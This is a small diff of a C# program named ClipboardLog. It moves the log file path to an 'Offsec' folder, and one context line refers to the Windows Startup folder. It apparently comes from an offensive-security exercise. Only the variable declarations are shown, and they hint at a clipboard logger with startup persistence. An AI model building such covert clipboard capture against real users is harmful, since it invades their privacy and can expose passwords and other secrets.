@@ -11,7 +11,7 @@ namespace ClipboardLog
     {
         // DATA MEMBERS:
         #region
-        string LogFilePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\ClipboardLog.txt";
+        string LogFilePath =  "L:\\Offsec\\ClipboardLog.txt";
         string ClipboardContent = "";
         string StartupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
         #endregion
